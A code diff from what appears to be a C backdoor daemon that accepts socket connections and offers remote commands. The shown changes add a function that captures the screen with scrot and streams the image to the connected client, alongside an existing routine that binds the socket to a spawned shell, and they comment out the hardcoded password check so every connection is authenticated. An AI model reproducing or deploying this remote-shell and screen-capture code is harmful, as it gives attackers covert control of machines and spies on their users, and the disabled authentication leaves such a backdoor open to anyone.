@@ -103,7 +103,7 @@ void	spawn_shell(t_users *users, char **envp)
 	{
 		for(int i=0; i<3; i++)
 			dup2(users->sd, i);
-		send(users->sd, "Spawning shell on port 4242\n> ", 30, 0);
+		send(users->sd, "Spawning shell\n> ", 15, 0);
 		if (execve(shell[0], shell, envp) == -1)
 			printf("error\n");
 	}
@@ -114,11 +114,56 @@ void	spawn_shell(t_users *users, char **envp)
 	}
 }
 
+void	screenshot(t_users *users, char **envp)
+{
+	char		*screen[] = {"/usr/bin/scrot", "/tmp/test1.png", NULL};
+	char		img[4096] = {0};
+	pid_t		pid = 0;
+	int			status;
+	int			fd = 0;
+	struct stat	st;
+	size_t		img_size = 0;
+	size_t		ret_read = 0;
+
+	int ret;
+
+	pid = fork();
+	if (pid == -1)
+		perror("fork failed");
+	else if (pid == 0)
+	{
+		/*chdir("/tmp");*/
+		/*for(int i = 0; i < 3; i++)*/
+			/*dup2(users->sd, i);*/
+		if ((ret = execve(screen[0], screen, envp)) == -1)
+			perror("execve");
+	}
+	else
+	{
+		waitpid(pid, &status, 0);
+		kill(pid, SIGTERM);
+	}
+	fd = open("/tmp/test1.png", O_RDONLY);
+	if (fd == -1)
+		perror("open");
+	if (stat("/tmp/test1.png", &st) == -1)
+		perror("stat");
+	img_size = st.st_size;
+	while (img_size > 0)
+	{
+		if ((ret_read = read(fd, &img, 4096)) == -1)
+			perror("read");
+		else
+			send(users->sd, &img, ret_read, 0);
+		img_size -= ret_read;
+	}
+	unlink("/tmp/test1.png");
+}
+
 bool	run_daemon(t_connexion *connexion, char **envp)
 {
 	char		buffer[BUFFSIZE + 1];
 	ssize_t		valrecv = 0;
-	char	*screen[] = {"/usr/sbin/screencapture", "-x", "test1.png", NULL};
 	t_users		users;
 
 	memset(&users, 0, sizeof(users));
@@ -177,7 +222,7 @@ bool	run_daemon(t_connexion *connexion, char **envp)
 					buffer[valrecv -1] = '\0';
 					if (users.key[users.i] == false)
 					{
-						if (!strcmp(buffer, "rabougue"))
+						/*if (!strcmp(buffer, "rabougue"))*/ //Ne pas oublier de uncoment
 							users.key[users.i] = true;
 					}
 					else
@@ -191,16 +236,13 @@ bool	run_daemon(t_connexion *connexion, char **envp)
 							users.nb_user--;
 						}
 						if (!strcmp(buffer, "?"))
-							send(users.sd, "'shell'	Spawn remote shell on 4243\n> ", 37, 0);
+						{
+							send(users.sd, "\n'shell'\tSpawn remote shell on 4243\n'screenshot'	take screenshot\n> ", 66, 0);
+						}
 						else if (!strcmp(buffer, "screenshot"))
-						{
-							if (execve(screen[0], screen, envp) == -1)
-								printf("error\n");
-						}
+							screenshot(&users, envp);
 						if (!strcmp(buffer, "shell"))
-						{
 							spawn_shell(&users, envp);
-						}
 					}
 					memset(&buffer, 0, BUFFSIZE);
 				}
